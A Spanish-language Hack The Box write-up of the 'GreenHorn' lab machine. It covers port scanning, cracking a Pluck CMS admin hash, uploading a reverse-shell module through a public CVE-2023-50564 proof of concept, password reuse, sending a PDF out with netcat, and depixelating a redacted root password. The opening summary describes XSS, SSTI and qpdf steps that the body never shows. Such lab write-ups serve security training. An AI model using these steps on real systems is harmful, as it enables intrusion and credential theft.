---
layout: single
title: "GreenHorn - Hack The Box"
excerpt: ""
date: 2024-06-05
classes: wide
header:
  teaser: /assets/images/htb-writeup-greenhorn/greenhorn_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - XSS
  - XSS session hijacking
  - SSTI
  - db creds
  - hash cracking
  - abusing sudoers > qpdf
---

![](/assets/images/htb-writeup-greenhorn/greenhorn_logo.png)

Para resolver esta máquina, interceptamos la solicitud de inicio de sesión, logrando llevar a cabo un XSS para robar una cookie de sesión válida. Con esta cookie, ingresamos al dashboard, que contiene un sistema de facturación que genera un código QR y un enlace. Al utilizar el enlace, se crea un escaneable, cuya solicitud interceptamos para poder inyectar SSTI. Posteriormente, logramos establecer una Reverse Shell. En el código fuente de la web, descubrimos en texto claro el usuario y la contraseña de la base de datos, encontrando así las credenciales de un usuario válido que desencriptamos. Finalmente, abusamos de los permisos SUDOERS del binario 'qpdf' para convertirnos en ROOT.


# PortScan
```java
# Nmap 7.94SVN scan initiated Fri Jul 26 08:19:43 2024 as: nmap -sCV -p22,80,3000 -oN ../nmap/Targeted 10.10.11.25
Nmap scan report for greenhorn.htb (10.10.11.25)
Host is up (0.052s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: Welcome to GreenHorn ! - GreenHorn
|_Requested resource was http://greenhorn.htb/?file=welcome-to-greenhorn
|_http-generator: pluck 4.7.18
| http-robots.txt: 2 disallowed entries 
|_/data/ /docs/
|_http-trane-info: Problem with XML parsing of /evox/about
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=7f63cabc26814f93; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=1e_vVQebnDrKLsTj_D-h9QAmBqQ6MTcyMTk5NjM5MTMyOTM1OTY0Mg; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 26 Jul 2024 12:19:51 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>GreenHorn</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=1692c4975c64aff4; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=ruVs7tym7wmHsFM0vVa_368OMPM6MTcyMTk5NjM5Njg0OTA1NjYwOA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 26 Jul 2024 12:19:56 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=7/26%Time=66A39467%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,37DB,"HTTP/1\.0\x20200\x20OK\r\nCache-Contr
SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCo
SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_git
SF:ea=7f63cabc26814f93;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Coo
SF:kie:\x20_csrf=1e_vVQebnDrKLsTj_D-h9QAmBqQ6MTcyMTk5NjM5MTMyOTM1OTY0Mg;\x
SF:20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opt
SF:ions:\x20SAMEORIGIN\r\nDate:\x20Fri,\x2026\x20Jul\x202024\x2012:19:51\x
SF:20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"the
SF:me-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=dev
SF:ice-width,\x20initial-scale=1\">\n\t<title>GreenHorn</title>\n\t<link\x
SF:20rel=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoiR
SF:3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6
SF:Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmh
SF:vcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLC
SF:JzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvY
SF:X")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(HTTPOptions,1A4,"HTTP/1\.0\x20405\x20Method\x20Not\x20All
SF:owed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Cont
SF:rol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nS
SF:et-Cookie:\x20i_like_gitea=1692c4975c64aff4;\x20Path=/;\x20HttpOnly;\x2
SF:0SameSite=Lax\r\nSet-Cookie:\x20_csrf=ruVs7tym7wmHsFM0vVa_368OMPM6MTcyM
SF:Tk5NjM5Njg0OTA1NjYwOA;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20Sam
SF:eSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Fri,\x2026\x20J
SF:ul\x202024\x2012:19:56\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPR
SF:equest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


# Web Site
![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726102600.png)

De primera se me ocurre que es un **CMS**, pensé de primeras "WordPress?, Joomla?", es los típicos vaya... pero para confirmarlo analice las tecnologías de la pagina con **whatweb**.
![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726102802.png)

descubro que es un "**Pluck**", nunca había oído de este CMS, pero hice una investigación rápida en internet, incluso de esa versión, descubriendo un **PoC** existente para un **RCE** logueado como admin [CVE-2023-50564](https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC), doy a "**admin**" en el Footer de la pagina principal y me redirige al logueo con ruta: **/login.php**, intente credenciales típicas, y no logre nada, de hecho después de varios intento me bloqueaba por 5 minutos, por lo que descartaría un **Brute Force Attack**.

![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726103611.png)

Como **nmap** reporto al principio por el banner del **:3000** era un **HTTP**, así que me dirijo allí a ver que es ya que **nmap** no relevo información interesante.

![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726103958.png)

Descubro un **Gitea**, que de primera no se que es, googleo & es un control de versiones así como **Github**, así que se me ocurre seguir indagando a ver si encuentro el código fuente del proyecto, asi que clickeo en "**Explore**".

![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726104135.png)

Descubriendo lo que parece ser el código fuente de la aplicación, así que empiezo a indagar & buscar credenciales o vulnerabilidades que lleven a un **RCE**.

![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726104350.png)

Descubriendo en el "**Login.php**", que utiliza un script en "**/data/settings/pass.php**" para verificar que esa es la contraseña de admin, y la contraseña que se ponga como input se convierte en un hash **sha512** para corroborar que esa es la contraseña correcta, asi que voy a ver la contraseña de admin en **data**...

![](Pasted image 20240726104837.png)

definitivamente es un hash, así que se me ocurre usar **John The Ripper** para probarlo con el diccionario de **Rockyou.txt** a ver si el hash coincide con alguna contraseña de ese diccionario...

![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726105308.png)

Logrando así encontrar la contraseña correcta para entrar como **admin** al CMS.

![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726105511.png)

y ya en este punto podría aprovecharme del **PoC** que encontré al principio para un **RCE** & entablarnos una **Reverse Shell.**

1. Nos clonamos el CVE con los exploit con Git.
```bash
git clone https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC
cd CVE-2023-50564_Pluck-v4.7.18_PoC
```

2. Modificamos el **shell.php** con nuestra IP & puerto de escucha para la shell.

3. Convertiremos ese **.php** en **zip.**
```bash
zip shell.zip shell.php
```

4. Nos ponemos en escucha con **Ncat**:
```bash
nc -nlvp PORT
```

5. Subimos el **.zip** en  la ruta **/admin.php?action=installmodule**:

y así recibiríamos la Shell:
![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726110108.png)

ya quedaría darle Tratamiento a la TTY, sino sabes [((HAZ CLICK AQUI))](https://4uli.github.io/tratamiento-tty/#)

____


# Privilege Escalation 1

Primero miro los usuarios con directorios en **/home**, descubriendo que existen dos.
![](Pasted image 20240726110350.png)

primero intento reutilizar la contraseña del panel del **CMS** con **GIT**, no logro nada, pero con **Junior** si reutilizar la contraseña, Y VUALA.

_____

# Privilege Escalation 2

![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726110522.png)

En el directorio personal de Junior hay un PDF de utilizando **OpenVAS**, que es un componente de escaneo automático, que para cierto escaneos necesita de permisos ROOT así que me interesa ver que tiene este **PDF**, procedo a mandarmelo a mi maquina atancate.

1. Nos ponemos en escucha con **Ncat** desde nuestro host esperando el .pdf.
```bash
nc -lvp 443 > 'Using OpenVAS.pdf'
```

2. Enviamos el .pdf desde la maquina comprometida.
```bash
nc IP PORT < 'Using OpenVAS.pdf'
```


Miramos el **.pdf** con el navegador que mejor nos siente...

![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726111532.png)

solo **ROOT** puede ejecutar **OpenVAS**, y esta la credenciales en el **pdf**, pero esta **"censurado"**, pero podemos usar herramienta para intentar descifrar la contraseña....

usamos la herramienta "**pdfimages**" para tomar una captura de la imagen de la contraseña, y posterior tratar de descifrarla
```bash
pdfimages 'Using OpenVAS.pdf' hidepass
```

nos creara un archivo **.ppm** el cual usaremos para la herramienta [Depix](https://github.com/spipm/Depix), clonando su repositorio y usando luego esta linea con los path's correctos:
```bash
python3 depix.py \
    -p /path/to/your/input/hidepass-000.ppm \
    -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png \
    -o /path/to/your/output.png
```


una vez finalice, nos dará un **output.png** el cual sera una "Reconstrucción" de la **"posible"** contraseña.
![](Pasted image 20240726112549.png)

intento escalar a **Root** con estas credenciales y...

![](/assets/images/htb-writeup-greenhorn/Pasted image 20240726112746.png)

MAGIAAAAAAAAAAA
